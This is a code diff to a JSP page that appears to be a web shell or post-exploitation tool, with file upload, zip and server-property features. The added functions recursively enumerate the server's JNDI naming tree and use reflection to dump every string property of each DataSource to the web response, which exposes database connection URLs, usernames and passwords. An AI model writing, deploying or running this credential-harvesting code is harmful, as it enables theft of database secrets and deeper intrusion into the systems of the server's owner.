@@ -4,6 +4,14 @@
 <%@ page import="java.util.StringTokenizer" %>
 <%@ page import="java.util.zip.ZipEntry" %>
 <%@ page import="java.util.zip.ZipOutputStream" %>
+<%@ page import="java.beans.BeanInfo" %>
+<%@ page import="java.beans.Introspector" %>
+<%@ page import="java.beans.PropertyDescriptor" %>
+<%@ page import="java.lang.reflect.Method" %>
+<%@ page import="java.lang.reflect.InvocationTargetException" %>
+<%@ page import="java.beans.IntrospectionException" %>
+<%@ page import="javax.sql.DataSource" %>
+<%@ page import="javax.naming.*" %>
 
 <%!
     static boolean isNotEmpty(Object obj) {
@@ -31,6 +39,51 @@
             baos.write(b,0,a);
         }
         return baos;
+    }
+
+
+    static void extractData(Object jndiObject, JspWriter out) throws IOException {
+        try {
+            BeanInfo info = Introspector.getBeanInfo(jndiObject.getClass(), Object.class);
+            PropertyDescriptor[] properties = info.getPropertyDescriptors();
+            for (int i=0; i < properties.length; i++) {
+                String propName = properties[i].getName();
+                Method method = properties[i].getReadMethod();
+                if (method != null) {
+                    if (String.class.equals(method.getReturnType()) && method.getName().startsWith("get")) {
+                        try {
+                            method.setAccessible(true);
+                            out.println(formatMessage(propName+":"+method.invoke(jndiObject)));
+                        } catch (IllegalAccessException e) {
+                            out.println(formatMessage(exceptionToString(e)));
+                        } catch (InvocationTargetException e) {
+                            out.println(formatMessage(exceptionToString(e)));
+                        }
+                    }
+                }
+            }
+        } catch (IntrospectionException e) {
+            out.println(formatMessage(exceptionToString(e)));
+        }
+    }
+
+    static void findJndi(String path, Context ctx, JspWriter out) throws NamingException, IOException {
+        NamingEnumeration namingEnumeration = ctx.list(path);
+        while(namingEnumeration.hasMore()) {
+            NameClassPair resource = (NameClassPair) namingEnumeration.next();
+            String name = resource.getName();
+            String lookPath = path + "/"+name;
+            try {
+                Object tmp = ctx.lookup(lookPath);
+                if (tmp instanceof Context) {
+                    findJndi(lookPath, ctx, out);
+                } else {
+                    if (tmp instanceof DataSource) {
+                        extractData(tmp, out);
+                    }
+                }
+            } catch (NamingException e) {}
+        }
     }
 
     static String findRealPath(String path) {
@@ -585,7 +638,8 @@
                     out.println(formatMessage(attributeName+": "+props.getProperty(attributeValue)));
                 }
 
-
+                InitialContext ctx = new InitialContext();
+                findJndi("java:comp", ctx, out);
             }
         } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
             if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
